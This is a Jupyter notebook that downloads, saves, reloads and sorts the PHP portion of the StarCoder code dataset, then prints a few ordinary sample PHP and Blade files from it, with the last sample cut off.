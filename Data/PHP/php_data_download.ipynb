{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from datasets import load_dataset, DownloadMode\n",
    "\n",
    "# First, download the dataset with caching\n",
    "def download_starcoderdata_php(save_directory, split=\"train\", download_mode=DownloadMode.REUSE_DATASET_IF_EXISTS):\n",
    "    try:\n",
    "        ds = load_dataset(\n",
    "            \"bigcode/starcoderdata\",\n",
    "            data_dir=\"php\",\n",
    "            split=split,\n",
    "            cache_dir=save_directory,\n",
    "            download_mode=download_mode,\n",
    "        )\n",
    "\n",
    "        # Save the dataset properly for later reloading\n",
    "        output_path = f\"{save_directory}/php_{split}_dataset\"\n",
    "        ds.save_to_disk(output_path)\n",
    "\n",
    "        print(f\"Dataset 'bigcode/starcoderdata' (PHP, {split}) successfully downloaded and saved to '{output_path}'.\")\n",
    "        return ds\n",
    "\n",
    "    except Exception as e:\n",
    "        print(f\"Error downloading dataset 'bigcode/starcoderdata' (PHP, {split}): {e}\")\n",
    "        return None"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "02712970592f40bebad56b3637dd162f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Resolving data files:   0%|          | 0/61 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "077da54d832648b6ae2f59973f544be4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Downloading data:   0%|          | 0/61 [00:00<?, ?files/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3182ebe12efc4d2188718e61b04707a3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00000-of-00061.parquet:   0%|          | 0.00/337M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9871e264ce8f4132b314daca100b0480",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00001-of-00061.parquet:   0%|          | 0.00/335M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7941224fbfe74072bdc4f90478c2a03a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00002-of-00061.parquet:   0%|          | 0.00/335M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e209e14c25804fc3b9f75e620568d9bc",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00003-of-00061.parquet:   0%|          | 0.00/337M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "90f4b55475c14eb3b4a8330473251473",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00004-of-00061.parquet:   0%|          | 0.00/337M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1bc45cb8a73a451a8bdc34f94f08a9e1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00005-of-00061.parquet:   0%|          | 0.00/335M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fea600e63ac34bd58d06d263610b35ca",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00006-of-00061.parquet:   0%|          | 0.00/334M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "42710ca3675e4eeea8f7b9f44fb20539",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00007-of-00061.parquet:   0%|          | 0.00/335M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "72592d95be9a436fa6e7eec098868841",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00008-of-00061.parquet:   0%|          | 0.00/338M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e32bae4288ea4f14a1769931a71de585",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00009-of-00061.parquet:   0%|          | 0.00/337M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f3bce48aacf741239fe36ac550f38ff8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00010-of-00061.parquet:   0%|          | 0.00/333M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8bc32a0419974249b4a4032b4b7ce394",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00011-of-00061.parquet:   0%|          | 0.00/334M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d80c16fa3ab54cb6b34adbe11debc8a8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00012-of-00061.parquet:   0%|          | 0.00/338M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3d3a934fc92844c2a17856371c528d08",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00013-of-00061.parquet:   0%|          | 0.00/333M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "134269c6c52b48048ee0e8caf901cd8d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00014-of-00061.parquet:   0%|          | 0.00/336M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8f8d0d13abee414e97dd3185e99195b6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00015-of-00061.parquet:   0%|          | 0.00/338M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "24c02c2bb78b4147820d5b23b23ff669",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00016-of-00061.parquet:   0%|          | 0.00/333M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e3c5d1b1511b449991831cee100ceefc",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00017-of-00061.parquet:   0%|          | 0.00/335M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f1531d9f3c4f49e3bb916ef649d57c85",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00018-of-00061.parquet:   0%|          | 0.00/333M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "910f2893b679416380292ec63f47056d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00019-of-00061.parquet:   0%|          | 0.00/339M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bea7e2089222411998d4a50cfdf56656",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00020-of-00061.parquet:   0%|          | 0.00/339M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a7d65877edb14df2b0aea77ee08650dc",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00021-of-00061.parquet:   0%|          | 0.00/336M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "332700fe7e07485fb13915f21783c2b8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00022-of-00061.parquet:   0%|          | 0.00/336M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "db22750a8b344f5d8cebc53133caf662",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00023-of-00061.parquet:   0%|          | 0.00/335M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d4b6983071894918a347e85aa1fe56b1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00024-of-00061.parquet:   0%|          | 0.00/336M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7ca758f9a0294d008b8f822555ade069",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00025-of-00061.parquet:   0%|          | 0.00/336M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8ff0e64232904876afb391f61c01d7ad",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00026-of-00061.parquet:   0%|          | 0.00/335M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6b26fe96d8964e18bbd9039e380601e2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00027-of-00061.parquet:   0%|          | 0.00/337M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2801b6481c15499c8cc1bfa003aa904b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00028-of-00061.parquet:   0%|          | 0.00/337M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9a577cb1ec8e4a9c9d41067b23d105f2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00029-of-00061.parquet:   0%|          | 0.00/336M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5bdff69fa40b4cba984f0c1d39599aef",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00030-of-00061.parquet:   0%|          | 0.00/337M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a8df152e3cbe484a8452c5dc30e13891",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00031-of-00061.parquet:   0%|          | 0.00/335M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "63239a7fe36641239f97c0d2310ef027",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00032-of-00061.parquet:   0%|          | 0.00/338M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f2added174f04c6d8b5514ec0419b4cb",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00033-of-00061.parquet:   0%|          | 0.00/334M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "85de607eca304cc29a9491cb478732b3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00034-of-00061.parquet:   0%|          | 0.00/335M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "450fd92f4bec4c1abec7c4899a62c5d1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00035-of-00061.parquet:   0%|          | 0.00/335M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5cd28165aeea4a4886defbc1f9c59983",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00036-of-00061.parquet:   0%|          | 0.00/338M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f7e76bf4514c41d098d7f06919cc130d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00037-of-00061.parquet:   0%|          | 0.00/336M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6b63059df3a8416a976de72b7bcdc440",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00038-of-00061.parquet:   0%|          | 0.00/335M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e9892bde8db446ea831a76d1682cf706",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00039-of-00061.parquet:   0%|          | 0.00/336M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "da6cfef1e8ab4ba0a5dc2ea4ba61a441",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00040-of-00061.parquet:   0%|          | 0.00/333M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7e417b6535e64519addb32600e653a08",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00041-of-00061.parquet:   0%|          | 0.00/338M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1932d20d40b1420188058bc269a2491f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00042-of-00061.parquet:   0%|          | 0.00/333M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "673d97f68277402c8ee224fd55d30fe6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00043-of-00061.parquet:   0%|          | 0.00/337M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e3a05ff6394045988cfb49be31b90a44",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00044-of-00061.parquet:   0%|          | 0.00/335M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a93c45f6d9a24c9ca36df53b8a203734",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00045-of-00061.parquet:   0%|          | 0.00/337M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "54bc2a87e7594dcb96ae947008deb17d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00046-of-00061.parquet:   0%|          | 0.00/335M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "60d802389a8a44d8b2ce307589464fc0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00047-of-00061.parquet:   0%|          | 0.00/336M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0ea447064af64e0984dc14bca8938002",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00048-of-00061.parquet:   0%|          | 0.00/336M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b1270b2dc3f64c98890113fd1fa4c2e4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00049-of-00061.parquet:   0%|          | 0.00/335M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "87e76a3633624c3b9b87a7aecf97a7c2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00050-of-00061.parquet:   0%|          | 0.00/336M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "670ee32ac8fa42ad913e1e948f32c2fc",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00051-of-00061.parquet:   0%|          | 0.00/332M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "902bbd38d19c463a9c4372d3fc15e222",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00052-of-00061.parquet:   0%|          | 0.00/336M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8eaa55b3c4d04e2ea0b45944b8856cb3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00053-of-00061.parquet:   0%|          | 0.00/333M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f5bdaf02fe3540d48150e0074ba9ffc1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00054-of-00061.parquet:   0%|          | 0.00/336M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c285d1ae5273460da8ae6d4483581908",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00055-of-00061.parquet:   0%|          | 0.00/336M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f6650ffe405346c7b32b7fdb1a1f1d1a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00056-of-00061.parquet:   0%|          | 0.00/338M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "eccece4efdde4263902cbb499aa238bc",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00057-of-00061.parquet:   0%|          | 0.00/334M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "37c4252d9dbd4ecd9a9a57b3f6e80346",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00058-of-00061.parquet:   0%|          | 0.00/333M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6dda7127938744598b9389327de40ac9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00059-of-00061.parquet:   0%|          | 0.00/336M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6df10281d2a347c49d2c9c5c9ea855cc",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "train-00060-of-00061.parquet:   0%|          | 0.00/339M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "58c252ccaff14322bcd181cf6cc1c52c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Generating train split: 0 examples [00:00, ? examples/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9b00110d6bce474dab83d7a20b1c1c08",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Loading dataset shards:   0%|          | 0/126 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "43f86fb240aa4038ae911973172204fc",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Saving the dataset (0/126 shards):   0%|          | 0/15683017 [00:00<?, ? examples/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Dataset 'bigcode/starcoderdata' (PHP, train) successfully downloaded and saved to './/php_train_dataset'.\n"
     ]
    }
   ],
   "source": [
    "ds = download_starcoderdata_php(save_directory=\"./\", split=\"train\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e30c9509bef34cba80e38659d7bd2d44",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Loading dataset from disk:   0%|          | 0/126 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from datasets import load_from_disk\n",
    "\n",
    "# Later, load the dataset from the saved location\n",
    "dataset = load_from_disk(\"./php_train_dataset\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Dataset({\n",
       "    features: ['max_stars_repo_path', 'max_stars_repo_name', 'max_stars_count', 'id', 'content'],\n",
       "    num_rows: 15683017\n",
       "})"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "datasets.arrow_dataset.Dataset"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "type(dataset)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'max_stars_repo_path': 'resources/views/well-product.blade.php', 'max_stars_repo_name': '151811513044/Hope', 'max_stars_count': 0, 'id': '0', 'content': '<reponame>151811513044/Hope\\n@extends(\\'template\\')\\n\\n@section(\\'content\\')\\n\\n<div class=\"shop-page-wrapper shop-page-padding\">\\n    <div class=\"container-fluid\">\\n        <div class=\"row pt-4\">\\n            <div class=\"col-lg-3\">\\n                @include(\\'layouts.products.sidebar\\')\\n            </div>\\n            <div class=\"col-lg-9\">\\n                <div class=\"shop-product-wrapper res-xl\">\\n                    <div class=\"shop-bar-area\">\\n                        <div class=\"shop-bar pb-60\">\\n                            <div class=\"shop-found-selector\">\\n                                <!-- <div class=\"shop-found\">\\n                                        <p><span>23</span> Product Found of <span>50</span></p>\\n                                    </div>\\n                                    <div class=\"shop-selector\">\\n                                        <label>Sort By : </label>\\n                                        <select name=\"select\">\\n                                            <option value=\"\">Default</option>\\n                                            <option value=\"\">A to Z</option>\\n                                            <option value=\"\"> Z to A</option>\\n                                            <option value=\"\">In stock</option>\\n                                        </select>\\n                                    </div> -->\\n                            </div>\\n                            <div class=\"shop-filter-tab\">\\n                                <div class=\"shop-tab nav\" role=tablist>\\n                                    <a class=\"active\" href=\"#grid-sidebar3\" data-toggle=\"tab\" role=\"tab\" aria-selected=\"false\">\\n                                        <i class=\"ti-layout-grid4-alt\"></i>\\n                                    </a>\\n                                    <a href=\"#grid-sidebar4\" data-toggle=\"tab\" role=\"tab\" aria-selected=\"true\">\\n                                        <i class=\"ti-menu\"></i>\\n                                    </a>\\n                                </div>\\n                            </div>\\n                        </div>\\n                        <div class=\"shop-product-content tab-content\">\\n                            <div id=\"grid-sidebar3\" class=\"tab-pane fade active show\">\\n                                @include(\\'layouts.products.grid_view\\')\\n                            </div>\\n                            <div id=\"grid-sidebar4\" class=\"tab-pane fade\">\\n                                @include(\\'layouts.products.list_view\\')\\n                            </div>\\n                        </div>\\n                    </div>\\n                </div>\\n                <div class=\"mt-50 text-center\">\\n                    {{ $products->links() }}\\n                </div>\\n            </div>\\n        </div>\\n    </div>\\n</div>\\n@include(\\'layouts.includes.modals\\')\\n@endsection'}\n"
     ]
    }
   ],
   "source": [
    "print(dataset[0])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "dataset = dataset.sort(column_names=[\"max_stars_count\", \"max_stars_repo_name\"], reverse=[True, False])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Example 0:\n",
      "<filename>extensions/vscode-colorize-tests/test/colorize-fixtures/issue-76997.php\n",
      "<hello></hello>\n",
      "\n",
      "\n",
      "\n",
      "Example 1:\n",
      "<script>\n",
      "    ...\n",
      "        <?php\n",
      "            foreach($actID AS $act) {\n",
      "                echo 'divNames.push(\\'[nid='.$act.']\\');';\n",
      "             }\n",
      "        ?>\n",
      "    ...\n",
      "</script>\n",
      "\n",
      "\n",
      "Example 2:\n",
      "<?php\n",
      "// Plugin Name: WPGatsby Test Plugin (for tests only)\n",
      "\n",
      "add_action( 'graphql_register_types', 'add_test_mutations' );\n",
      "\n",
      "function add_test_mutations() {\n",
      "  register_graphql_mutation( \"attachFeaturedImageToNodeById\", [\n",
      "    'description' => 'Attaches a MediaItem database ID to a post featured image by database ID.',\n",
      "    'inputFields' => [\n",
      "      'mediaItemId' => [\n",
      "        'type' => 'Int'\n",
      "      ],\n",
      "      'postId' => [\n",
      "        'type' => 'Int'\n",
      "      ]\n",
      "    ],\n",
      "    'outputFields' => [\n",
      "      'success' => [\n",
      "        'type' => 'Boolean'\n",
      "      ]\n",
      "    ],\n",
      "    'mutateAndGetPayload' => function( $input ) {\n",
      "\n",
      "      if ( empty( $input['mediaItemId'] ) || empty( $input['postId'] ) ) {\n",
      "        return [\n",
      "          'success' => false\n",
      "        ];\n",
      "      }\n",
      "\n",
      "      $selectedPost = get_post( $input['postId'] );\n",
      "      $selectedMediaItem = get_post( $input['mediaItemId'] );\n",
      "\n",
      "\n",
      "      if ( ! $selectedPost || ! $selectedMediaItem ) {\n",
      "        return [\n",
      "          'success' => false,\n",
      "        ];\n",
      "      }\n",
      "\n",
      "      set_post_thumbnail( $selectedPost->ID, $selectedMediaItem->ID );\n",
      "\n",
      "      wp_update_post( [\n",
      "        'ID' => $selectedPost->ID,\n",
      "      ] );\n",
      "\n",
      "      return [\n",
      "        'success' => true,\n",
      "      ];\n",
      "    }\n",
      "  ] );\n",
      "\n",
      "  register_graphql_mutation( \"removeFeaturedImageFromNodeById\", [\n",
      "    'description' => 'Removes a post featured image by post database ID.',\n",
      "    'inputFields' => [\n",
      "      'postId' => [\n",
      "        'type' => 'Int'\n",
      "      ]\n",
      "    ],\n",
      "    'outputFields' => [\n",
      "      'success' => [\n",
      "        'type' => 'Boolean'\n",
      "      ]\n",
      "    ],\n",
